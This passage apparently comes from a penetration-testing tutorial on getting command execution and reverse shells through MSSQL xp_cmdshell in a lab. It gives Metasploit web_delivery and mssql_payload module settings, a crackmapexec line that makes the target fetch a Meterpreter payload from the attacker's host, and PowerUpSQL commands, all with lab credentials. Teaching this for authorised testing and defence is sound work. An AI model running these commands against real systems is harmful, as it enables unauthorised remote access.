<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjncosqGi7LbnoHo0c-Hq1pYotnF-xn3P5YKyeurKkbeTtGnm8hQoMYdBGbT-sDoOhAdkb8hdMOJZI5bfF5rTh1p_ggKHMCCO3S-PokqrK2ksQ0VrtY0z1i2Alp-cEPkyTk8H_qTYpHRmvsqKHKG8og-pjf4iPClKYQ0_-UUritHdsY7UcKrfxaNfgwWvCo/s16000/62.png"/></span></p>
<h3><span style="color: #800000">Reverse shell using crackmapexec and metasploit</span></h3>
<p><span style="color: #000000">Furthermore, <strong data-start="561" data-end="577">Metasploit</strong> includes a <strong data-start="589" data-end="613">web delivery exploit</strong> that generates a <strong data-start="631" data-end="638">URL</strong> for transferring files to the target system. You can use the following commands to implement this technique:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -q
use exploit/multi/script/web_delivery
set target 2
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.31.141
run</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEilvt4Tlx0yD_cDlX3ewRae2_cA9blwAeWV3_jVTmpfNQplgYhjSSeeyAGM2G1q2NOBi-eOUNE3onA9bx0RqQ76b2rSzbeMu1GHhuk9XreGTFWijmahQ4MmsPR_8HOjK3vUu0HV2_7QItbfnBZMVjZHcasBcIHWKlBWK32Pn7FzrVtoHlTe-gaRMZjOipng/s16000/70.png" alt="xp_cmdshell command execution" width="1504" height="728"/></span></p>
<p><span style="color: #000000">Once the exploit runs, you’ll notice that <strong data-start="2111" data-end="2125">Metasploit</strong> generates a <strong data-start="2138" data-end="2145">URL</strong> hosting the payload. You can use this URL with the crackmapexec tool to execute the <strong data-start="2232" data-end="2251">reverse shell</strong>.</span></p>
<p data-start="2065" data-end="2344"><span style="color: #000000">In this example, the payload is available at:</span><br data-start="2298" data-end="2301"/><strong><span style="color: #000000">http://192.168.31.141:8080/TrBYNRKFCChZSz</span></strong></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">crackmapexec mssql 192.168.31.126 -u "raj" -p "Password@1" -M web_delivery -o URL=http://192.168.31.141:8080/TrBYNRKFCChZSz</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiD2Z-EDrfYlqJRbv2V9tfGbDoY-DQCruHXwb09I75djRcGQf9TAYIy8Q19W9OAoxlZfWosOqvuDJ2xOXgqjjJwjLWiW_hwxOKjrEpMN5Tc055rzSiAbpJXT7pQFmsKCIRishuKwEVUwB7y0tGZQMIhQkvyaO0aPG2bqtuZeLfBwtnf7zmz4ZIsRTWtUa6E/s16000/71.png"/></span></p>
<p><span style="color: #000000">Next, access the generated URL using the <strong data-start="794" data-end="817">web delivery module</strong> of crackmapexec. Observe that a <strong data-start="856" data-end="881">Meterpreter session</strong> is initiated upon access.</span></p>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhIAL0OM-dLNs0QCrqB4h3w2x1U3me5svhBAm_5POOjnhIdHeyRU42xsNmBvpbdSlLVzmbXEmj7vdXWX6vXjmk2QO34LAJ9NaIzWYvUn0KTQ4yIXnkPRpE6d4hANv27nJLd4GEYAWUWbPBAluLLzn3j4U4EDeTakgiWX4N86Ho09mjSems29I7u8o9FNHq_/s16000/72.png" alt="xp_cmdshell command execution" width="993" height="573"/></span></p>
<p><span style="color: #000000">Additionally, you can use the <strong data-start="2380" data-end="2399">mssql_payload</strong> exploit available in <strong data-start="2421" data-end="2437">Metasploit</strong>. Once executed, this exploit opens a <strong data-start="2475" data-end="2498">Meterpreter session</strong>. Use the following commands to run this module:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/mssql/mssql_payload
set rhost 192.168.31.126
set database master
set username sa
set password Password@123
run</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiBka6eerM3XYRDfI79iuCMA_arL2Zke9-87xa8vBd5PtsISHhlb6hdlMBdUTxxcBUDOXNWHzOSnbdOk6Hjw3iYdQ3wELoXcYmZl990HlKAj50TftpvdZPZKfjHqjjKv5g17b6PrPj1eKLdSlSV77pvXGmbDSIoWtMgkVuFEhfhk8t52Mfgp3i7kWPVZsD3/s16000/80.png"/></span></p>
<div class="relative flex min-h-[calc(2rem+theme(spacing[3.5])*2)] min-w-[60px] flex-col gap-2 break-words rounded-2xl border border-gray-100 bg-gradient-to-br from-gray-50 px-5 py-3.5 text-gray-600 prose-pre:my-2 dark:border-gray-800 dark:from-gray-800/40 dark:text-gray-300">
<div>
<div class="prose max-w-none dark:prose-invert max-sm:prose-sm prose-headings:font-semibold prose-h1:text-lg prose-h2:text-base prose-h3:text-base prose-pre:bg-gray-800 dark:prose-pre:bg-gray-900">
<p><span style="color: #000000">We execute the exploit and subsequently obtain a <strong>Meterpreter</strong> session, thereby gaining access to the system.</span></p>
</div>
</div>
</div>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiRyjkfvMWoOZN_yRPo8HOuy7KaIXkfBf9LEtgZ_E8LJuGLlzkqlEwFC_soBFUJQ4UKLxAj9ovjMUVQuEWm2s264LcyGc4cfnPLlJgoUPT22YSApPEFJy3WLSyMHIAbAqjo_UWeHHjPxKMEQtNp8I4ugqyGMJ2i02Vy7cKodEArCLIp7Lz4wGUbH9Lucaap/s16000/81.png" alt="xp_cmdshell command execution" width="1032" height="557"/></span></p>
<p><span style="color: #000000">Additionally, another viable method is to use the <strong data-start="1112" data-end="1136">mssql_exec exploit</strong> within <strong data-start="1144" data-end="1160">Metasploit</strong>. Therefore, the attacker manually inputs commands using this method, and then displays the output after establishing the connection.</span></p>
<p><span style="color: #000000">Following are the commands to use this exploit:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/admin/mssql/mssql_exec
set rhost 192.168.31.126
set database master
set username sa
set password Password@123
set cmd "ipconfig"
run</pre>
<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhyuzAagJ0SFHXx6rMqnyYbejfkudKl6sTL-Z93sjJfywfMj3Vmp_HusX2qU2BKtHF5-UwoyZvplSBPmW-7To-OwgCQzMWvkWxsQcLE62ua1rSOg8ImSCKknWON-kshPfdhEScQSOMYdAgv4knClptvalK-evKO6C8wc2WPxeZHPdiJOG36Xx5XtN0h2X3h/s16000/82.png"/></span></p>
<h3><span style="color: #800000">Command execution using PowerUPSQL</span></h3>
<p><span style="color: #000000">Penetration testers and security professionals use PowerUpSQL to audit and assess SQL Server instances.</span><span style="color: #000000"> It offers capabilities for discovering, enumerating, and exploiting <strong data-start="1525" data-end="1554">SQL Server environments</strong> across enterprise networks. You can download the script from: <span style="color: #0000ff"><a class="" style="color: #0000ff" href="https://github.com/NetSPI/PowerUpSQL" target="_new" rel="noopener" data-start="3892" data-end="3928">https://github.com/NetSPI/PowerUpSQL</a></span></span></p>
<div class="relative flex min-h-[calc(2rem+theme(spacing[3.5])*2)] min-w-[60px] flex-col gap-2 break-words rounded-2xl border border-gray-100 bg-gradient-to-br from-gray-50 px-5 py-3.5 text-gray-600 prose-pre:my-2 dark:border-gray-800 dark:from-gray-800/40 dark:text-gray-300">
<div>
<div class="prose max-w-none dark:prose-invert max-sm:prose-sm prose-headings:font-semibold prose-h1:text-lg prose-h2:text-base prose-h3:text-base prose-pre:bg-gray-800 dark:prose-pre:bg-gray-900">
<div class="relative flex min-h-[calc(2rem+theme(spacing[3.5])*2)] min-w-[60px] flex-col gap-2 break-words rounded-2xl border border-gray-100 bg-gradient-to-br from-gray-50 px-5 py-3.5 text-gray-600 prose-pre:my-2 dark:border-gray-800 dark:from-gray-800/40 dark:text-gray-300">
<div>
<div class="prose max-w-none dark:prose-invert max-sm:prose-sm prose-headings:font-semibold prose-h1:text-lg prose-h2:text-base prose-h3:text-base prose-pre:bg-gray-800 dark:prose-pre:bg-gray-900">
<p><span style="color: #000000">We actively utilize <strong>PowerUpSQL</strong> to audit and assess <strong>SQL Server</strong> instances, and subsequently, we verify that the user has <strong>sysadmin</strong> privileges and check the status of <strong>xp_cmdshell</strong>.</span></p>
</div>
</div>
</div>
</div>
</div>
</div>
<p><span style="color: #000000">Finally, you can use the following <strong data-start="1907" data-end="1930">PowerShell commands</strong> on the target system <strong data-start="1952" data-end="1987">after gaining the initial shell</strong>:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell
powershell -ep bypass
Import-Module .PowerUpSQL.ps1
Invoke-SQLOSCmd -Username sa -Password Password@123 -Instance WIN-JE6KIAEEJ09SQLEXPRESS -Command whoami -Verbose</pre>
<p><span style="color: #000000"><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhWEY9uDuHzuvkiYNYuC04weNBKXeXBSxxGKBJD-koRolsxoz2QjSF6RKmdlANoi7l4_94pneoO73mF4TbfiylxFrFtp-7g-G45TMgL_Pq2rH9bijQQ6URrEpmtEON-6dMMLSaxxbSVpyO3W1K1eK0-xjHo4uxUIWa3TelfUgaz1KhTSF9sAFLKHwygeGeZ/s16000/83.png" alt="xp_cmdshell command execution" width="1779" height="692"/></span></p>
<h3><span style="color: #800000">Conclusion</span></h3>
<p><span style="color: #000000">In conclusion, <strong>xp_cmdshell</strong> represents a highly useful feature provided by <strong>Microsoft for MSSQL Server</strong>. However, when misconfigured, it allows attackers to execute system-level commands. Therefore, organizations must ensure they do not expose sysadmin credentials under any circumstances, as compromising these credentials can result in unauthorized <strong>xp_cmdshell command</strong> execution, potentially enabling remote command execution.</span></p>
<p><span style="color: #000000"><strong>Author: </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Conta</span>ct <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
